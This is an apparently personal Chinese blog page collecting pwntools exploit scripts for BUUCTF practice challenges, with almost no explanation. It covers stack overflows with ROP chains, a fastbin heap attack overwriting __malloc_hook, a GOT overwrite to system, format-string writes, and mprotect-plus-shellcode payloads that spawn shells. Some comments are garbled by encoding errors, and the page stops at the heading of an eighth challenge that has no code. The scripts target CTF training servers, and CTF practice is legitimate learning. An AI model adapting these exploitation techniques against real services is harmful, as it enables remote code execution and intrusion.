<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Mist","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
  </script>

  <meta name="description" content="#NO.00 pwn1_sctf_2016_sovle ###exp 12345678910#-*- coding:utf-8-*-from pwn import *p &#x3D; remote(&#39;node3.buuoj.cn&#39;,28928)#print p.recvuntil(&#39;Tell me something about yourself: &#39;)payloa">
<meta property="og:type" content="article">
<meta property="og:title" content="BUUCTF-PWN">
<meta property="og:url" content="http://yoursite.com/2020/09/21/BUUCTF-PWN/index.html">
<meta property="og:site_name" content="Adam">
<meta property="og:description" content="#NO.00 pwn1_sctf_2016_sovle ###exp 12345678910#-*- coding:utf-8-*-from pwn import *p &#x3D; remote(&#39;node3.buuoj.cn&#39;,28928)#print p.recvuntil(&#39;Tell me something about yourself: &#39;)payloa">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2020-09-21T07:53:03.000Z">
<meta property="article:modified_time" content="2020-09-21T07:53:38.873Z">
<meta property="article:author" content="Adam">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://yoursite.com/2020/09/21/BUUCTF-PWN/">


<script data-pjax class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>BUUCTF-PWN | Adam</title>
  






  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="Adam" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Adam</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-guestbook">

    <a href="/guestbook/" rel="section"><i class="comment fa-fw"></i>guestbook</a>

  </li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <section class="post-toc-wrap sidebar-panel">
      </section>
      <!--/noindex-->

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Adam</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">5</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/Adam-01" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Adam-01" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/dj1614850528@163.com" title="E-Mail → dj1614850528@163.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </section>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">
      

      

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/21/BUUCTF-PWN/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Adam">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Adam">
    </span>

    
    
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          BUUCTF-PWN
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2020-09-21 15:53:03 / 修改时间：15:53:38" itemprop="dateCreated datePublished" datetime="2020-09-21T15:53:03+08:00">2020-09-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <p>#NO.00 pwn1_sctf_2016_sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,28928)</span><br><span class="line"></span><br><span class="line">#print p.recvuntil(&#39;Tell me something about yourself: &#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;I&#39;*0x14 + &#39;a&#39;*4 + p64(0x08048F0D)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>#NO.01 warmup_csaw_2016_sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io&#x3D;remote(&quot;node2.buuoj.cn.wetolink.com&quot;,28872)</span><br><span class="line">#io&#x3D;process(&quot;.&#x2F;warmup_csaw_2016&quot;)</span><br><span class="line"></span><br><span class="line">pop_rdi &#x3D; 0x400713</span><br><span class="line">pop_rsi_r15 &#x3D; 0x400711</span><br><span class="line">bss &#x3D; 0x601058 </span><br><span class="line">gets_addr &#x3D; 0x400500</span><br><span class="line">sys_addr &#x3D; 0x4004d0</span><br><span class="line">print io.recv()</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x40+&#39;a&#39;*8 +p64(pop_rdi) + p64(bss) + p64(gets_addr) + p64(pop_rdi)+p64(bss)+p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.02 babyheap_0ctf_2017_sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39; </span><br><span class="line"></span><br><span class="line">p &#x3D;process(&#39;.&#x2F;babyheap_0ctf_2017&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line">#p &#x3D;remote(&#39;node3.buuoj.cn&#39;,26914)</span><br><span class="line"></span><br><span class="line">def Allocate(size):</span><br><span class="line">    p.recvuntil(&quot;Command:&quot;)</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.recvuntil(&quot;Size:&quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def Fill(idx,con):</span><br><span class="line">    p.recvuntil(&quot;Command: &quot;)</span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line">    p.recvuntil(&quot;Index:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(&quot;Size:&quot;)</span><br><span class="line">    p.sendline(str(len(con)))</span><br><span class="line">    p.recvuntil(&quot;Content:&quot;)</span><br><span class="line">    p.sendline(con)</span><br><span class="line">def Free(idx):</span><br><span class="line">    p.recvuntil(&quot;Command:&quot;)</span><br><span class="line">    p.sendline(&quot;3&quot;)</span><br><span class="line">    p.recvuntil(&quot;Index:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">def Dump(idx):</span><br><span class="line">    p.recvuntil(&quot;Command:&quot;)</span><br><span class="line">    p.sendline(&quot;4&quot;)</span><br><span class="line">    p.recvuntil(&quot;Index:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(&#39;Content: \n&#39;)</span><br><span class="line">    return p.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Allocate(0x60)#idx&#x3D;0</span><br><span class="line">Allocate(0x30)#idx&#x3D;1</span><br><span class="line"></span><br><span class="line">#sleep(1)</span><br><span class="line">Fill(0,&quot;a&quot;*0x60+p64(0)+p64(0x71))</span><br><span class="line"></span><br><span class="line">Allocate(0x100)#idx&#x3D;2</span><br><span class="line"></span><br><span class="line">Fill(2,&quot;a&quot;*0x20+p64(0)+p64(0x71))</span><br><span class="line"></span><br><span class="line">Free(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Allocate(0x60)#idx&#x3D;2</span><br><span class="line"></span><br><span class="line">Fill(1,&quot;a&quot;*0x30+p64(0)+p64(0x111))</span><br><span class="line"></span><br><span class="line">Allocate(0x60)</span><br><span class="line"></span><br><span class="line">Free(2)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">print Dump(1)</span><br><span class="line">#print hexDump(1)[:-8]</span><br><span class="line">leak &#x3D; u64(Dump(1)[-25:-17])-0x58</span><br><span class="line">print &quot;leak:&quot;+hex(leak)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base&#x3D;leak-0x3c4b20</span><br><span class="line">malloc_hook&#x3D;base+libc.sym[&#39;__malloc_hook&#39;]</span><br><span class="line">print hex(malloc_hook)</span><br><span class="line">Free(1)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">Fill(0,&quot;a&quot;*0x60+p64(0)+p64(0x71)+p64(malloc_hook-0x23)+p64(0))</span><br><span class="line"></span><br><span class="line">Allocate(0x60)#idx</span><br><span class="line">Allocate(0x60)#idx</span><br><span class="line">Fill(2,&quot;a&quot;*3+p64(0)+p64(0)+p64(base+0x4526a))</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">Allocate(0x100)#idx4</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>#NO.03 babyfengshui_sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#p&#x3D;remote(&#39;111.198.29.45&#39;,35423)</span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26557)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;babyfengshui&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;libc.so.6&#39;)</span><br><span class="line">obj&#x3D;LibcSearcher(&#39;free&#39;,0xf7659750)</span><br><span class="line">def add_note(size,length,text):</span><br><span class="line">    p.recvuntil(&#39;Action: &#39;)</span><br><span class="line">    p.sendline(&#39;0&#39;)</span><br><span class="line">    p.recvuntil(&#39;size of description: &#39;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&#39;name: &#39;)</span><br><span class="line">    p.sendline(&#39;AAA&#39;)</span><br><span class="line">    p.recvuntil(&#39;text length: &#39;)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(&#39;text: &#39;)</span><br><span class="line">    p.sendline(text)</span><br><span class="line">def delete_note(idx):</span><br><span class="line">    p.recvuntil(&#39;Action: &#39;)</span><br><span class="line">    p.sendline(&#39;1&#39;)</span><br><span class="line">    p.recvuntil(&#39;index: &#39;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">def display_note(idx):</span><br><span class="line">    p.recvuntil(&#39;Action: &#39;)</span><br><span class="line">    p.sendline(&#39;2&#39;)</span><br><span class="line">    p.recvuntil(&#39;index: &#39;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">def update_note(idx,length,text):</span><br><span class="line">    p.recvuntil(&#39;Action: &#39;)</span><br><span class="line">    p.sendline(&#39;3&#39;)</span><br><span class="line">    p.recvuntil(&#39;index: &#39;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(&#39;text length: &#39;)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.sendlineafter(&#39;text: &#39;,text)</span><br><span class="line"></span><br><span class="line">add_note(0x80,0x80,&#39;abcd&#39;)</span><br><span class="line">add_note(0x80,0x80,&#39;efgh&#39;)</span><br><span class="line">add_note(0x8,0x8,&#39;&#x2F;bin&#x2F;sh\00&#39;)</span><br><span class="line"></span><br><span class="line">delete_note(0)</span><br><span class="line"></span><br><span class="line">add_note(0x100,0x19c,&#39;a&#39;*0x198 + p32(elf.got[&#39;free&#39;]))</span><br><span class="line">display_note(1)</span><br><span class="line">p.recvuntil(&#39;description: &#39;)</span><br><span class="line">free_addr&#x3D;u32(p.recv(4))</span><br><span class="line">print hex(free_addr)</span><br><span class="line"></span><br><span class="line">system_addr &#x3D; free_addr - (obj.dump(&#39;free&#39;) - obj.dump(&#39;system&#39;))</span><br><span class="line">log.info(&quot;system_addr 0x%x&quot; % system_addr)</span><br><span class="line">update_note(1,0x4,p32(system_addr))</span><br><span class="line"></span><br><span class="line">delete_note(2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.04 ����ռ�2019 ����]PWN5-sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;i386&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line"></span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;����ռ�2019 ����]PWN5&#39;)</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,27557)</span><br><span class="line">elf &#x3D; ELF(&#39;����ռ�2019 ����]PWN5&#39;)</span><br><span class="line"></span><br><span class="line">offset &#x3D; 10</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">#��������ǽ�atoi��Ϊsystem,��������ʱֱ�Ӵ���&#x2F;bin&#x2F;sh��if�����ֱ�ӵõ�shell.</span><br><span class="line">system_addr &#x3D; 0x08049080</span><br><span class="line">aoti_addr &#x3D; elf.got[&#39;atoi&#39;]</span><br><span class="line">p.recvuntil(&#39;your name:&#39;)</span><br><span class="line">payload &#x3D; fmtstr_payload(offset,&#123;aoti_addr:system_addr&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#39;your passwd:&#39;)</span><br><span class="line">p.sendline(&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line">p.interactive()</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">addr&#x3D;0x0804C044 #unk_804C044_addr</span><br><span class="line"></span><br><span class="line">payload&#x3D;p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3)</span><br><span class="line">payload+&#x3D;&#39;%10$hhn%11$hhn%12$hhn%13$hhn&#39;</span><br><span class="line"># %10$hhn��ʾ��ƫ��Ϊ10��д��ĵ�ַ�ռ�Ϊ1�ֽ�</span><br><span class="line"># %$hn��ʾд��ĵ�ַ�ռ�Ϊ2�ֽ�</span><br><span class="line"># %$lln��ʾд��ĵ�ַ�ռ�Ϊ8�ֽ� </span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;your name:&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#39;your passwd:&#39;)</span><br><span class="line">p.sendline(str(0x10101010)) </span><br><span class="line">#������ĸ�0x10�Ǳ�ʾpayloa���ĸ���ַ�����ݳ���,32λһ����ַռ4�ֽ�</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.05 get_started_3dsctf_2016_sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">#sh &#x3D; process(&quot;.&#x2F;get_started_3dsctf_2016&quot;)</span><br><span class="line">sh &#x3D;  remote(&#39;node3.buuoj.cn&#39;,27290)</span><br><span class="line">elf &#x3D; ELF(&quot;get_started_3dsctf_2016&quot;)</span><br><span class="line">pop2_ret &#x3D; 0x0809a7dc</span><br><span class="line">pop3_ret &#x3D; 0x0804f460</span><br><span class="line">payload &#x3D; &#39;a&#39; * 56 + p32(elf.symbols[&#39;mprotect&#39;]) + p32(pop3_ret) + p32(0x080EB000) + p32(0x3000) + p32(7) + p32(elf.symbols[&#39;read&#39;]) + p32(pop3_ret) + p32(0) + p32(0x080EBF80) + p32(0x200) + p32(0x080EBF80)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">#sleep(1)</span><br><span class="line">#input()</span><br><span class="line">sh.sendline(asm(shellcraft.sh()))</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.06 not_the_same_3dsctf_2016_sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;i386&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line"></span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;not_the_same_3dsctf_2016&#39;)</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26723)</span><br><span class="line">elf &#x3D; ELF(&#39;not_the_same_3dsctf_2016&#39;)</span><br><span class="line">offset &#x3D; 0x2d</span><br><span class="line">ppp &#x3D; 0x0809e3e5</span><br><span class="line">bss &#x3D; 0x080EC624</span><br><span class="line">pit_got &#x3D; 0x080EB000</span><br><span class="line">payload &#x3D; &#39;a&#39;*offset + p32(elf.symbols[&#39;mprotect&#39;])</span><br><span class="line">payload +&#x3D; p32(ppp) + p32(pit_got) + p32(0x1001)+ p32(7) + p32(elf.symbols[&#39;read&#39;])</span><br><span class="line">payload +&#x3D; p32(ppp) + p32(0) + p32(bss) + p32(0x1000) + p32(bss)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">#���ؿ���</span><br><span class="line">offset &#x3D; 0x2d</span><br><span class="line">get_secret &#x3D; 0x080489A0</span><br><span class="line">fl4g &#x3D; 0x080ECA2D</span><br><span class="line">printf &#x3D; 0x0804F0A0</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*offset + p32(get_secret)</span><br><span class="line">payload +&#x3D; p32(printf)+p32(1) + p32(fl4g)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line">&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>



<p>#NO.07 ciscn_2019_n_8_sovle</p>
<p>###exp</p>
